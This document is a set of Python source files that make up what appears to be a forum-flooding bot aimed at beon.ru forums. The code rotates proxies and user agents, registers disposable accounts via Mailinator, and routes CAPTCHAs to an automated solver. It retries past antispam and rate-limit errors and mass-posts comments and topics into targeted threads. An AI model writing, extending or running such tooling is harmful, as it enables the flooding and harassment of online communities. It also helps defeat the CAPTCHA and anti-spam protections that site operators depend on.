parser.add_argument('--caprate_minp', type=int, default=5,
    help='Cap rate minimum possible count for limit check')
parser.add_argument('--caprate_limit', type=float, default=0.8,
    help='Captcha rate limit')

parser.add_argument('--comment_successtimeout', type=float, default=0.8,
    help='Comment success timeout')
parser.add_argument('--topic_successtimeout', type=float, default=0.1,
    help='Topic success timeout')
parser.add_argument('--errortimeout', type=float, default=3,
    help='Error timeout')


parser.add_argument('--stop-on-closed', action='store_true', default=False,
    help='Forget about closed topics')
parser.add_argument('--die-on-neterror', action='store_true', default=False,
    help='Terminate spawn in case of too many NetErrors')

c = parser.parse_args()

# rps = {}

noproxy_rp = sup.net.RequestPerformer()
noproxy_rp.proxy = ''
noproxy_rp.timeout = c.noproxy_timeout
noproxy_rp.timeout = c.rp_timeout

# rps[''] = noproxy_rp

# Achtung: DataLoader probably isn't thread-safe.
d = DataLoader(noproxy_rp, c.only_cache)
c.router_addr = d.addrs['rpcrouter']
noproxy_rp.useragent = random.choice(d.ua_list)

def terminate():
    logger.info('Shutdown initiated')
    # send_passthrough([b'GLOBAL', b'WZWorker', b'terminate'])
    send_to_wm([b'GLOBAL', b'WZWorker', b'terminate'])
    for t in threading.enumerate():
        if isinstance(t, threading.Timer):
            t.cancel()
    # try:
    #     wm.term()
    #     wm.join()
    # except: # WM instance is not created yet.
    #     pass
    logger.info('Exiting')

def interrupt_handler(signal, frame):
    pass # Just do nothing

def terminate_handler(signal, frame):
    terminate()

signal.signal(signal.SIGINT, interrupt_handler)
signal.signal(signal.SIGTERM, terminate_handler)

def make_net(proxy, proxytype):
    # if proxy in rps:
    #     return rps[proxy]
    net = sup.net.RequestPerformer()
    net.proxy = proxy
    if proxytype == 'HTTP' or proxytype == 'HTTPS':
        net.proxy_type = sup.proxytype.http
    elif proxytype == 'SOCKS4':
        net.proxy_type = sup.proxytype.socks4
    elif proxytype == 'SOCKS5':
        net.proxy_type = sup.proxytype.socks5
    else:
        raise TypeError('Invalid proxytype %s' % proxytype)
    # rps[proxy] = net
    net.useragent = random.choice(d.ua_list)
    net.timeout = c.rp_timeout
    return net

# UniWipe patching start
def upload_avatar(self, ud):
    if ('avatar_uploaded' in ud[0] and
        ud[0]['avatar_uploaded'] is True):
        return
    files = []
    for sd in os.walk(c.av_dir):
        files.extend(sd[2])
    av = os.path.join(sd[0], random.choice(files))
    self.log.info('Uploading %s as new avatar', av)
    self.site.uploadavatar('0', av)
    ud[0]['avatar'] = av
    ud[0]['avatar_uploaded'] = True

from lib.mailinator import Mailinator
# from lib.tempmail import TempMail as Mailinator

# Move this to WipeManager
def create_spawn(proxy, proxytype, pc, uq=None):
    for domain in domains:
        if domain in targets:
            tlist = targets[domain]
        else:
            tlist = list()
            targets[domain] = tlist
        if domain in forums:
            fset = forums[domain]
        else:
            fset = set()
            forums[domain] = fset
        net = make_net(proxy, proxytype)
        net.cookiefname = (proxy if proxy else 'noproxy')+'_'+domain
        w = UniWipe(fset, tlist, sbjfun, message, pc, net, domain, Mailinator,
            uq(domain) if uq else None)
        w.stoponclose = c.stop_on_closed
        w.die_on_neterror = c.die_on_neterror
        w.caprate_minp = c.caprate_minp
        w.caprate_limit = c.caprate_limit
        w.conlimit = c.conlimit
        w.comment_successtimeout = 0.2
        if c.upload_avatar:
            w.hooks['post_login'].append(upload_avatar)
        yield w

# UniWipe patching end

class WipeManager:
    def __init__(self, config, *args, **kvargs):
        super().__init__(*args, **kvargs)
        self.newproxyfile = 'newproxies.txt'
        self.proxylist = set()
        self.c = config
        self.threads = []
        self.processes = []
        self.th_sa = 'inproc://wm-wth.sock'
        self.th_ba = 'inproc://wm-back.sock'
        self.pr_sa = 'ipc://wm-wpr.sock'
        self.pr_ba = 'ipc://wm-back.sock'
        self.userqueues = {}
        self.usersfile = 'wm_users.pickle'
        self.targetsfile = 'wm_targets.pickle'
        self.bumplimitfile = 'wm_bumplimit.pickle'

    def init_th_sock(self):
        self.log.info(
            'Initializing intraprocess signal socket %s', self.th_sa)
        self.th_sock = self.p.ctx.socket(zmq.PUB)
        self.th_sock.bind(self.th_sa)

    def init_th_back_sock(self):
        self.log.info(
            'Initializing intraprocess backward socket %s', self.th_ba)
        self.th_back_sock = self.p.ctx.socket(zmq.ROUTER)
        self.th_back_sock.bind(self.th_ba)

    def init_pr_sock(self):
        self.log.info(
            'Initializing interprocess signal socket %s', self.pr_sa)
        self.pr_sock = self.p.ctx.socket(zmq.PUB)
        self.pr_sock.bind(self.pr_sa)

    def init_pr_back_sock(self):
        self.log.info(
            'Initializing interprocess backward socket %s', self.pr_ba)
        self.pr_back_sock = self.p.ctx.socket(zmq.ROUTER)
        self.pr_back_sock.bind(self.pr_ba)

    def read_newproxies(self):
        if not os.path.isfile(self.newproxyfile):
            return
        newproxies = set()
        with open(self.newproxyfile, 'rt') as f:
            for line in f:
                try:
                    line = line.rstrip('\n')
                    proxypair = tuple(line.split(' '))
                    if len(proxypair) < 2:
                        self.log.warning('Line %s has too few spaces', line)
                        continue
                    if len(proxypair) > 2:
                        self.log.debug('Line %s has too much spaces', line)
                        proxypair = (proxypair[0], proxypair[1])
                    newproxies.add(proxypair)
                except Exception as e:
                    self.log.exception('Line %s raised exception %s', line, e)
        # os.unlink(self.newproxyfile)
        return newproxies.difference(self.proxylist)

    def add_spawns(self, proxypairs):
        while self.running.is_set():
            try:
                try:
                    proxypair = proxypairs.pop()
                except Exception:
                    return
                self.proxylist.add(proxypair)
                for spawn in create_spawn(proxypair[0], proxypair[1], self.pc,
                        self.get_userqueue):
                    self.log.info('Created spawn %s', spawn.name)
                    self.spawnqueue.put(spawn, False)
            except Exception as e:
                self.log.exception('Exception ""%s"" raised on create_spawn', e)

    def spawn_workers(self, wclass, count, args=(), kvargs={}):
        wname = str(wclass.__name__)
        self.log.info('Starting %s(s)', wname)
        if issubclass(wclass, workers.WZWorkerThread):
            type_ = 0
            if not hasattr(self, 'th_sock'):
                self.init_th_sock()
            if not hasattr(self, 'th_back_sock'):
                self.init_th_back_sock()
        elif issubclass(wclass, workers.WZWorkerProcess):
            type_ = 1
            if not hasattr(self, 'pr_sock'):
                self.init_pr_sock()
            if not hasattr(self, 'pr_back_sock'):
                self.init_pr_back_sock()
        else:
            raise Exception('Unknown wclass type')
        for i in range(count):
            if not self.running.is_set():
                break
            try:
                w = wclass(*args, name='.'.join(
                    (wname, ('pr{0}' if type_ else 'th{0}').format(i))),
                    **kvargs)
                if type_ == 0:
                    self.threads.append(w)
                    w.start(self.p.ctx, self.th_sa)
                elif type_ == 1:
                    self.processes.append(w)
                    w.start(self.pr_sa)
            except Exception as e:
                self.log.exception('Exception ""%s"" raised on %s spawn',
                                   e, wname)

    def spawn_nworkers(self, type_, fun, count, args=(), kvargs={}):
        wname = str(fun.__name__)
        self.log.info('Starting %s(s)', wname)
        if type_ == 0:
            if not hasattr(self, 'th_sock'):
                self.init_th_sock()
            if not hasattr(self, 'th_back_sock'):
                self.init_th_back_sock()
        elif type_ == 1:
            if not hasattr(self, 'pr_sock'):
                self.init_pr_sock()
            if not hasattr(self, 'pr_back_sock'):
                self.init_pr_back_sock()
        else:
            raise Exception('Unknown wclass type')
        for i in range(count):
            if not self.running.is_set():
                break
            try:
                if type_ == 0:
                    w = workers.WZWorkerThread(
                        self.c.router_addr, fun, args, kvargs,
                        name='.'.join((wname, 'th{0}'.format(i))))
                    self.threads.append(w)
                    w.start(self.p.ctx, self.th_sa)
                elif type_ == 1:
                    w = workers.WZWorkerProcess(self.c.router_addr, fun, args, kvargs,
                        name='.'.join((wname, 'pr{0}'.format(i))))
                    self.processes.append(w)
                    w.start(self.pr_sa)
            except Exception as e:
                self.log.exception('Exception ""%s"" raised on %s spawn',
                                   e, wname)

    def spawn_wipethreads(self):
        return self.spawn_nworkers(0, WipeThread, self.c.tcount,
                                  (self.pc, self.spawnqueue))

    def spawn_evaluators(self):
        self.log.info('Initializing Evaluator')
        from evproxy import EvaluatorProxy
        def ev_init():
            from lib.evaluators.PyQt4Evaluator import Evaluator
            return Evaluator()
        return self.spawn_nworkers(1, EvaluatorProxy, self.c.ecount,
                                  (ev_init,))

    def load_users(self):
        if not os.path.isfile(self.usersfile):
            return
        with open(self.usersfile, 'rb') as f:
            users = pickle.loads(f.read())
        try:
            for domain in users.keys():
                uq = Queue()
                for ud in users[domain]:
                    self.log.debug('Loaded user %s:%s', domain, ud['login'])
                    uq.put(ud)
                self.userqueues[domain] = uq
        except Exception as e:
            self.log.exception(e)
            self.log.error('Failed to load users')

    def save_users(self):
        users = {}
        for d, uq in self.userqueues.items():
            uqsize = uq.qsize()
            uds = []
            for i in range(uqsize):
                uds.append(uq.get(False))
            users[d] = uds
        with open(self.usersfile, 'wb') as f:
            f.write(pickle.dumps(users, pickle.HIGHEST_PROTOCOL))
        self.log.info('Saved users')

    def get_userqueue(self, domain):
        try:
            uq = self.userqueues[domain]
        except KeyError:
            self.log.info('Created userqueue for %s', domain)
            uq = Queue()
            self.userqueues[domain] = uq
        return uq

    def load_targets(self):
        fname = self.targetsfile
        if not os.path.isfile(fname):
            return
        with open(fname, 'rb') as f:
            data = pickle.loads(f.read())
        if 'targets' in data:
            self.log.debug('Target list was loaded')
            targets.update(data['targets'])
        if 'forums' in data:
            self.log.debug('Forum set was loaded')
            forums.update(data['forums'])
        if 'domains' in data:
            self.log.debug('Domain set was loaded')
            domains.update(data['domains'])
        if 'sets' in data:
            self.log.debug('Other sets were loaded')
            self.pc.sets.update(data['sets'])

    def load_bumplimit_set(self):
        if not os.path.isfile(self.bumplimitfile):
            return
        with open(self.bumplimitfile, 'rb') as f:
            self.pc.sets['bumplimit'].update(pickle.loads(f.read()))

    def save_targets(self):
        data = {
            'targets': targets,
            'forums': forums,
            'domains': domains,
            'sets': self.pc.sets,
        }
        with open(self.targetsfile, 'wb') as f:
            f.write(pickle.dumps(data, pickle.HIGHEST_PROTOCOL))

    def targets_from_witch(self):
        for t in d.witch_targets:
            if t['domain'] == 'beon.ru' and t['forum'] == 'anonymous':
                try:
                    add_target_exc(t['id'], t['user'])
                except ValueError:
                    pass

    def terminate(self):
        msg = [b'GLOBAL']
        msg.extend(wzrpc.make_sig_msg(b'WZWorker', b'terminate', []))
        if hasattr(self, 'th_sock'):
            self.th_sock.send_multipart(msg)
        if hasattr(self, 'pr_sock'):
            self.pr_sock.send_multipart(msg)

    def join_threads(self):
        for t in self.threads:
            t.join()

    def send_passthrough(self, interface, method, frames):
        msg = [frames[0]]
        msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:]))
        self.th_sock.send_multipart(msg)
        self.pr_sock.send_multipart(msg)

    def __call__(self, parent):
        self.p = parent
        self.log = parent.log
        self.inter_sleep = parent.inter_sleep
        self.running = parent.running
        self.p.sig_sock.setsockopt(zmq.SUBSCRIBE, b'WipeManager')
        self.p.wz.set_sig_handler(b'WipeManager', b'passthrough', self.send_passthrough)
        if self.c.tcount > 0:
            self.pc = ProcessContext(self.p.name, self.p.ctx,
                self.c.router_addr, noproxy_rp)
            self.spawnqueue = Queue()
            self.load_bumplimit_set()
            self.load_targets()
            self.load_users()
            self.spawn_wipethreads()
        if self.c.ecount > 0:
            self.spawn_evaluators()
        try:
            while self.running.is_set():
                # self.targets_from_witch()
                if self.c.tcount == 0:
                    self.inter_sleep(5)
                    continue
                self.pc.check_waiting()
                new = self.read_newproxies()
                if not new:
                    self.inter_sleep(5)
                    continue
                self.add_spawns(new)
        except WorkerInterrupt:
            pass
        except Exception as e:
            self.log.exception(e)
        self.terminate()
        self.join_threads()
        if self.c.tcount > 0:
            self.save_users()
            self.save_targets()

wm = workers.WZWorkerThread(c.router_addr, WipeManager, (c,),
    name='SpaghettiMonster')
wm.start(ctx, sig_addr)

def add_target(domain, id_, tuser=None):
    if domain not in targets:
        targets[domain] = []
    tlist = targets[domain]
    id_ = str(id_)
    tuser = tuser or ''
    t = (tuser, id_)
    logger.info('Appending %s to targets[%s]', repr(t), domain)
    tlist.append(t)

def remove_target(domain, id_, tuser=None):
    tlist = targets[domain]
    id_ = str(id_)
    tuser = tuser or ''
    t = (tuser, id_)
    logger.info('Removing %s from targets[%s]', repr(t), domain)
    tlist.remove(t)

def add_target_exc(domain, id_, tuser=None):
    if domain not in targets:
        targets[domain] = []
    tlist = targets[domain]
    id_ = str(id_)
    tuser = tuser or ''
    t = (tuser, id_)
    if t in protected:
        raise ValueError('%s is protected' % repr(t))
    if t not in tlist:
        logger.info('Appending %s to targets[%s]', repr(t), domain)
        tlist.append(t)

r_di = re.compile(regexp.f_udi)

def atfu(urls):
    for user, domain, id1, id2 in r_di.findall(urls):
        id_ = id1+id2
        add_target(domain, id_, user)

def rtfu(urls):
    for user, domain, id1, id2 in r_di.findall(urls):
        id_ = id1+id2
        remove_target(domain, id_, user)

def get_forum_id(name):
    id_ = d.bm_id_forum.get_key(name)
    int(id_, 10)  # id is int with base 10
    return id_

# def aftw(name):
#     id_ = get_forum_id(name)
#     logger.info('Appending %s (%s) to forums', name, id_)
#     forums.append(id_)

# def rffw(name):
#     id_ = get_forum_id(name)
#     logger.info('Removing %s (%s) from forums', name, id_)
#     forums.remove(id_)

# def aftw(name):
#     id_ = get_forum_id(name)
#     logger.info('Appending %s to forums', name)
#     forums.add(name)

# def rffw(name):
#     id_ = get_forum_id(name)
#     logger.info('Removing %s from forums', name)
#     forums.remove(name)

r_udf = re.compile(regexp.udf_prefix)

def affu(urls):
    for user, domain, forum in r_udf.findall(urls):
        if domain not in forums:
            forums[domain] = set()
        if len(forum) > 0:
            get_forum_id(forum)
        logger.info('Appending %s:%s to forums[%s]', user, forum, domain)
        forums[domain].add((user, forum))

def rffu(urls):
    for user, domain, forum in r_udf.findall(urls):
        if len(forum) > 0:
            get_forum_id(forum)
        logger.info('Removing %s:%s from forums[%s]', user, forum, domain)
        forums[domain].remove((user, forum))

def add_user(domain, login, passwd):
    uq = wm.get_userqueue(domain)
    uq.put({'login': login, 'passwd': passwd}, False)

def send_to_wm(frames):
    msg = [frames[0]]
    msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:]))
    sig_sock.send_multipart(msg)

def send_passthrough(frames):
    msg = [b'WipeManager']
    msg.extend(wzrpc.make_sig_msg(b'WipeManager', b'passthrough', frames))
    sig_sock.send_multipart(msg)

def get_pasted_lines(sentinel):
    'Yield pasted lines until the user enters the given sentinel value.'
    print(""Pasting code; enter '{0}' alone on the line to stop."".format(sentinel))
    while True:
        l = input(':')
        if l == sentinel:
            return
        else:
            yield l

def send_execute_to_wm(code):
    msg = [b'WipeManager']
    msg.extend((b'WZWorker', b'execute', code))
    send_to_wm(msg)

def send_execute_to_ev(code):
    msg = [b'EVProxy']
    msg.extend((b'WZWorker', b'execute', code))
    send_passthrough(msg)

def send_execute(name, code):
    msg = [name.encode('utf-8')]
    msg.extend((b'WZWorker', b'execute', code))
    send_passthrough(msg)

def pexecute_in(name):
    send_execute(name, '\n'.join(get_pasted_lines('--')).encode('utf-8'))

def pexecute_in_wm():
    send_execute_to_wm('\n'.join(get_pasted_lines('--')).encode('utf-8'))

def pexecute_in_ev():
    send_execute_to_ev('\n'.join(get_pasted_lines('--')).encode('utf-8'))

def drop_users():
    send_passthrough([b'WipeSkel', b'WipeSkel', b'drop-user'])

def log_spawn_name():
    send_passthrough([b'WipeThread', b'WipeThread', b'log-spawn-name'])

try:
    import IPython
    if c.no_shell:
        IPython.embed_kernel()
    else:
        IPython.embed()
except ImportError:
    # fallback shell
    if c.no_shell:
        while True:
            time.sleep(1)
    else:
        while True:
            try:
                exec(input('> '))
            except KeyboardInterrupt:
                print(""KeyboardInterrupt"")
            except SystemExit:
                break
            except:
                print(traceback.format_exc())

terminate()
/n/n/nuniwipe.py/n/n# -*- coding: utf-8 -*-
# -*- mode: python -*-
from sup.net import NetError
from wzworkers import WorkerInterrupt
from wipeskel import WipeSkel, WipeState, cstate
from beon import exc, regexp
from collections import ChainMap
import re

class UniWipe(WipeSkel):
    def __init__(self, forums, targets, sbjfun, msgfun, *args, **kvargs):
        self.sbjfun = sbjfun
        self.msgfun = msgfun
        self.forums = forums
        self.targets = (type(targets) == str and [('', targets)]
                        or type(targets) == tuple and list(targets)
                        or targets)
        super().__init__(*args, **kvargs)
        self.ignore_map = ChainMap(
            self.pc.sets['closed'], self.pc.sets['bumplimit'],
            self.pc.sets['bugged'], self.pc.sets['protected'],
            self.targets)

    def on_caprate_limit(self, rate):
        if not self.logined:
            self._capdata = (0, 0)
            return
        self.log.warning('Caprate limit reached, calling dologin() for now')
        self.dologin()
        # super().on_caprate_limit(rate)

    def comment_loop(self):
        for t in self.targets:
            self.schedule(self.add_comment, (t, self.msgfun()))
        if len(self.targets) == 0:
            self.schedule(self.scan_targets_loop)
        else:
            self.schedule(self.comment_loop)

    def add_comment(self, t, msg):
        # with cstate(self, WipeState.posting_comment):
        if True: # Just a placeholder
            try:
                # self.counter_tick()
                self.postmsg(t[1], msg, t[0])
            except exc.Success as e:
                self.counters['comments'] += 1
                self.w.sleep(self.comment_successtimeout)
            except exc.Antispam as e:
                self.w.sleep(self.comment_successtimeout)
                self.schedule(self.add_comment, (t, msg))
            except (exc.Closed, exc.UserDeny) as e:
                try:
                    self.targets.remove(t)
                except ValueError:
                    pass
                self.w.sleep(self.comment_successtimeout)
            except exc.Captcha as e:
                self.log.error('Too many wrong answers to CAPTCHA')
                self.schedule(self.add_comment, (t, msg))
            except exc.UnknownAnswer as e:
                self.log.warn('%s: %s', e, e.answer)
                self.schedule(self.add_comment, (t, msg))
            except exc.Wait5Min as e:
                self.schedule(self.add_comment, (t, msg))
                self.schedule_first(self.switch_user)
            except exc.EmptyAnswer as e:
                self.log.info('Removing %s from targets and adding to bugged', t)
                self.pc.sets['bugged'].add(t)
                try:
                    self.targets.remove(t)
                except ValueError as e:
                    pass
                self.w.sleep(self.errortimeout)
            except exc.TopicDoesNotExist as e:
                self.log.info('Removing %s from targets and adding to bugged', t)
                self.pc.sets['bugged'].add(t)
                try:
                    self.targets.remove(t)
                except ValueError as e:
                    pass
                self.w.sleep(self.errortimeout)
            except exc.TemporaryError as e:
                self.schedule(self.add_comment, (t, msg))
                self.w.sleep(self.errortimeout)
            except exc.PermanentError as e:
                try:
                    self.targets.remove(t)
                except ValueError as e:
                    pass
                self.w.sleep(self.errortimeout)
            except UnicodeDecodeError as e:
                self.log.exception(e)
                self.w.sleep(self.errortimeout)

    def forumwipe_loop(self):
        for f in self.forums.copy():
            self.counter_tick()
            try:
                self.addtopic(self.msgfun(), self.sbjfun(), f)
            except exc.Success as e:
                self.counters['topics'] += 1
                self.w.sleep(self.topic_successtimeout)
            except exc.Wait5Min as e:
                self.topic_successtimeout = self.topic_successtimeout + 0.1
                self.log.info('Wait5Min exc caught, topic_successtimeout + 0.1, cur: %f',
                    self.topic_successtimeout)
                self.w.sleep(self.topic_successtimeout)
            except exc.Captcha as e:
                self.log.error('Too many wrong answers to CAPTCHA')
                self.long_sleep(10)
            except exc.UnknownAnswer as e:
                self.log.warning('%s: %s', e, e.answer)
                self.w.sleep(self.errortimeout)
            except exc.PermanentError as e:
                self.log.error(e)
                self.w.sleep(self.errortimeout)
            except exc.TemporaryError as e:
                self.log.warn(e)
                self.w.sleep(self.errortimeout)

    def get_targets(self):
        found_count = 0
        for user, forum in self.forums:
            targets = []
            self.log.debug('Scanning first page of the forum %s:%s', user, forum)
            page = self.site.get_page('1', forum, user)
            rxp = re.compile(regexp.f_sub_id.format(user, self.site.domain, forum))
            found = set(map(lambda x: (user, x[0]+x[1]), rxp.findall(page)))
            for t in found:
                if t in self.ignore_map:
                    continue
                targets.append(t)
            lt = len(targets)
            found_count += lt
            if lt > 0:
                self.log.info('Found %d new targets in forum %s:%s', lt, user, forum)
            else:
                self.log.debug('Found no new targets in forum %s:%s', user, forum)
            self.targets.extend(targets)
        return found_count

    def scan_targets_loop(self):
        with cstate(self, WipeState.scanning_for_targets):
            while len(self.targets) == 0:
                c = self.get_targets()
                if c == 0:
                    self.log.info('No targets found at all, sleeping for 30 seconds')
                    self.long_sleep(30)
            self.schedule(self.comment_loop)
        if len(self.forums) == 0:
            self.schedule(self.wait_loop)

    def wait_loop(self):
        if len(self.targets) > 0:
            self.schedule(self.comment_loop)
            return
        if len(self.forums) == 0:
            with cstate(self, WipeState.waiting_for_targets):
                while len(self.forums) == 0:
                    # To prevent a busy loop.
                    self.counter_tick()
                    self.w.sleep(1)
        self.schedule(self.scan_targets_loop)

    def _run(self):
        self.schedule(self.dologin)
        self.schedule(self.wait_loop)
        self.schedule(self.counter_ticker.tick)
        try:
            self.perform_tasks()
        except NetError as e:
            self.log.error(e)
        except WorkerInterrupt as e:
            self.log.warning(e)
        except Exception as e:
            self.log.exception(e)
        self.return_user()
# tw_flag = False
# if len(self.targets) > 0:
#     with cstate(self, WipeState.posting_comment):
#         while len(self.targets) > 0:
#             self.threadwipe_loop()
#     if not tw_flag:
#         tw_flag = True
# if tw_flag:
#     # Sleep for topic_successtimeout after last comment
#     # to prevent a timeout spike
#     self.w.sleep(self.topic_successtimeout)
#     tw_flag = False
# with cstate(self, WipeState.posting_topic):
# self.forumwipe_loop()
/n/n/nwipeskel.py/n/n# -*- coding: utf-8 -*-
# -*- mode: python -*-
import logging, re
from queue import Queue, Empty
import zmq
import beon, sup, wzrpc
from beon import regexp
from wzworkers import WorkerInterrupt
from ocr import OCRError, PermOCRError, TempOCRError
from sup.ticker import Ticker
from userdata import short_wordsgen
from enum import Enum
from collections import Counter, deque

class ProcessContext:
    def __init__(self, name, ctx, wz_addr, noproxy_rp):
        self.log = logging.getLogger('.'.join((name, type(self).__name__)))
        self.zmq_ctx = ctx
        self.ticker = Ticker()
        self.sets = {}
        self.sets['waiting'] = dict()
        self.sets['pending'] = set()

        self.sets['targets'] = set()
        self.sets['closed'] = set()
        self.sets['bumplimit'] = set()
        self.sets['protected'] = set()
        self.sets['bugged'] = set()

        self.wz_addr = wz_addr
        self.noproxy_rp = noproxy_rp

    def make_wz_sock(self):
        self.log.debug('Initializing WZRPC socket')
        wz_sock = self.zmq_ctx.socket(zmq.DEALER)
        wz_sock.setsockopt(zmq.IPV6, True)
        wz_sock.connect(self.wz_addr)
        return wz_sock

    def check_waiting(self):
        elapsed = self.ticker.elapsed()
        waiting = self.sets['waiting']
        for k, v in waiting.copy().items():
            rem = v - elapsed
            if rem <= 0:
                del waiting[k]
                self.log.info('Removing %s from %s', k[0], k[1])
                try:
                    self.sets[k[1]].remove(k[0])
                except KeyError:
                    self.log.error('No %s in %s', k[0], k[1])
            else:
                waiting[k] = rem

    def add_waiting(self, sname, item, ttl):
        self.sets['waiting'][(item, sname)] = ttl

class WTState(Enum):
    null = 0
    starting = 2
    empty = 3
    sleeping = 4
    running = 5

class WipeState(Enum):
    null = 0
    starting = 2
    terminating = 3
    sleeping = 4
    running = 5

    logging_in = 6
    post_login_hooks = 7
    registering = 8
    pre_register_hooks = 9
    post_register_hooks = 10
    deobfuscating_capage = 11
    solving_captcha = 12
    reporting_code = 13

    operation = 50
    waiting_for_targets = 51
    scanning_for_targets = 52
    posting_comment = 53
    posting_topic = 54

class state:
    def __init__(self, defstate):
        self.defstate = defstate
        self.state = defstate

    def __call__(self, state):
        self.state = state
        return self

    def __enter__(self):
        pass

    def __exit__(self, exception_type, exception_value, traceback):
        self.state = self.defstate

    @property
    def name(self):
        return self.state.name

    @property
    def value(self):
        return self.state.value

class cstate:
    def __init__(self, obj, state):
        self.obj = obj
        self.backstate = obj.state
        self.newstate = state

    def __enter__(self):
        self.obj.log.info('Switching state to %s', repr(self.newstate))
        self.obj.state = self.newstate

    def __exit__(self, exception_type, exception_value, traceback):
        self.obj.log.info('Switching state to %s', repr(self.backstate))
        self.obj.state = self.backstate


class WipeThread:
    def __init__(self, pc, spawnqueue, *args, **kvargs):
        self.pc = pc
        self.spawnqueue = spawnqueue
        self.spawn = None
        self.state = WTState.null
        self.wz_reply = None

    def deobfuscate_capage(self, domain, page):
        result = []
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success or status == wzrpc.status.error:
                result.extend(map(lambda x: x.decode('utf-8'), data))
            elif status == wzrpc.status.e_req_denied:
                self.log.warn('Status {0}, reauthentificating'.
                    format(wzrpc.name_status(status)))
                self.p.auth_requests()
                that.retry = True
            elif status == wzrpc.status.e_timeout:
                self.log.warn('Timeout {0}, retrying'.format(data[0]))
                that.retry = True
            else:
                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))
                that.retry = True
        self.p.wz_wait_reply(accept,
            b'Evaluator', b'evaluate', (domain.encode('utf-8'), page.encode('utf-8')),
            timeout=60)
        return tuple(result)

    def solve_captcha(self, img):
        result = []
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success or status == wzrpc.status.error:
                result.extend(map(lambda x:x.decode('utf-8'), data))
            elif status == wzrpc.status.e_req_denied:
                self.log.warn('Status {0}, reauthentificating'.\
                    format(wzrpc.name_status(status)))
                self.p.auth_requests()
                that.retry = True
            elif status == wzrpc.status.e_timeout:
                self.log.warn('Timeout {0}, retrying'.format(data[0]))
                that.retry = True
            else:
                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))
                that.retry = True
        self.p.wz_wait_reply(accept,
            b'Solver', b'solve', (b'inbound', img), timeout=300)
        if len(result) == 2: # Lame and redundant check. Rewrite this part someday.
            return result
        else:
            raise OCRError('Solver returned error %s', result)
        return tuple(result)

    def report_code(self, cid, status):
        def accept(that, reqid, seqnum, status, data):
            if status == wzrpc.status.success:
                self.log.debug('Successfully reported captcha status')
            elif status == wzrpc.status.error:
                self.log.error('Solver returned error on report: %s', repr(data))
            elif status == wzrpc.status.e_req_denied:
                self.log.warn('Status {0}, reauthentificating'.\
                    format(wzrpc.name_status(status)))
                self.p.auth_requests()
            else:
                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))
                that.retry = True
        self.p.wz_wait_reply(accept,
            b'Solver', b'report', (status.encode('utf-8'), cid.encode('utf-8')))

    def __call__(self, parent):
        self.p = parent
        self.log = parent.log
        self.running = parent.running
        self.sleep = parent.inter_sleep
        self.p.wz_auth_requests = [
            (b'Evaluator', b'evaluate'),
            (b'Solver', b'solve'),
            (b'Solver', b'report')]
        cst = cstate(self, WTState.starting)
        cst.__enter__()
        self.p.sig_sock.setsockopt(zmq.SUBSCRIBE, b'WipeThread')
        def handle_lsn(interface, method, data):
            if hasattr(self, 'spawn') and self.spawn:
                self.log.info('My current spawn is %s, state %s',
                    self.spawn.name, self.spawn.state.name)
            else:
                self.log.debug('Currently I do not have spawn')
        self.p.wz.set_sig_handler(b'WipeThread', b'log-spawn-name', handle_lsn)
        def handle_te(interface, method, data):
            if self.state is WTState.empty:
                self.p.term()
        self.p.wz.set_sig_handler(b'WipeThread', b'terminate-empty', handle_te)

        try:
            self.p.wz_connect()
            self.p.auth_requests()
        except WorkerInterrupt as e:
            self.log.error(e)
            return
        with cstate(self, WTState.empty):
            while self.running.is_set():
                try:
                    self.spawn = self.spawnqueue.get(False)
                except Empty:
                    self.sleep(1)
                    continue
                with cstate(self, WTState.running):
                    try:
                        self.spawn.run(self)
                    except WorkerInterrupt as e:
                        self.log.error(e)
                    except Exception as e:
                        self.log.exception('Spawn throwed exception %s, requesting new', e)
                    del self.spawn
                    self.spawn = None
                    self.spawnqueue.task_done()
        cst.__exit__(None, None, None)

class WipeSkel(object):
    reglimit = 10
    loglimit = 10
    conlimit = 3
    catrymax = 3
    _capdata = (0, 0)
    caprate = 0
    caprate_minp = 10
    caprate_limit = 0.9
    successtimeout = 1
    comment_successtimeout = 0
    topic_successtimeout = 0.8
    counter_report_interval = 60
    errortimeout = 3
    uqtimeout = 5  # Timeout for userqueue
    stoponclose = True
    die_on_neterror = False

    def __init__(self, pc, rp, domain, mrc, userqueue=None):
        self.pc = pc
        self.rp = rp
        self.state = WipeState.null
        self.site = beon.Beon(domain, self.http_request)
        self.name = '.'.join((
            type(self).__name__,
            self.rp.proxy.replace('.', '_') if self.rp.proxy
            else 'noproxy',
            self.site.domain.replace('.', '_')))
        self.rp.default_encoding = 'cp1251'
        self.rp.default_decoding = 'cp1251'
        self.rp.def_referer = self.site.ref  # Referer for net.py
        self.hooks = {
            'pre_register_new_user': [],
            'post_register_new_user': [],
            'post_login': [],
            'check_new_user': [],
        }
        self.counter_ticker = Ticker()
        self.counters = Counter()
        self.task_deque = deque()
        self.logined = False
        self.noproxy_rp = self.pc.noproxy_rp
        self.mrc = mrc
        if userqueue:
            self.userqueue = userqueue
        else:
            self.userqueue = Queue()

    def schedule(self, task, args=(), kvargs={}):
        self.task_deque.appendleft((task, args, kvargs))

    def schedule_first(self, task, args=(), kvargs={}):
        self.task_deque.append((task, args, kvargs))

    def perform_tasks(self):
        with cstate(self, WipeState.running):
            while self.w.running.is_set():
                self.counter_tick()
                try:
                    t = self.task_deque.pop()
                except IndexError:
                    return
                t[0](*t[1], **t[2])

    def long_sleep(self, time):
        time = int(time)
        with cstate(self, WipeState.sleeping):
            step = int(time/10 if time > 10 else 1)
            for s in range(0, time, step):
                self.w.sleep(step)
                self.counter_tick()

    def http_request(self, url, postdata=None, onlyjar=False, referer=None,
                     encoding=None, decoding=None):
        _conc = 0
        while self.w.running.is_set():
            _conc += 1
            try:
                return self.rp.http_req(
                    url, postdata, onlyjar, referer, encoding, decoding)
            except sup.NetError as e:
                if isinstance(e, sup.ConnError):
                    if self.die_on_neterror and _conc > self.conlimit:
                        raise
                    self.log.warn('%s, waiting. t: %s', e.args[0], _conc)
                    self.w.sleep(self.errortimeout)
                else:
                    self.log.error('%d %s', e.ec, e.args[0])
                    if self.die_on_neterror:
                        raise
                    else:
                        self.w.sleep(10)
        else:
            raise WorkerInterrupt()

